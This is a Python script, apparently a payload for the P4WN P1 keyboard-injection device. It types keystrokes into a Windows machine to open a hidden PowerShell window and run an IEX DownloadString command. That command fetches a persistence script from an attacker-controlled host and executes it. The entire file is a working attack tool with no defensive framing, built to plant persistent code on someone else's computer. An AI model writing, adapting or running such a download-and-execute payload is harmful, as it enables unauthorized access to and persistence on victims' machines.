#!/usr/bin/env python3
import os, sys, time, pathlib
P4WN_HOME=os.environ.get("P4WN_HOME","/opt/p4wnp1")
sys.path.insert(0,str(pathlib.Path(P4WN_HOME)/"tools"))
from hid_type import win_r, type_string

# Provide your own script at payloads/www/persist.ps1 (served by web)
URI = os.getenv("PERSIST_URI","/payloads/persist.ps1")
LHS = os.getenv("P4WN_LHOST","10.0.0.1")

def main():
    win_r(); time.sleep(0.4)
    type_string("powershell -nop -w hidden\n"); time.sleep(0.3)
    type_string(f"IEX(New-Object Net.WebClient).DownloadString('http://{LHS}{URI}')\n")
    print("[*] Invoked persistence script from", f"http://{LHS}{URI}")
if __name__ == "__main__": main()
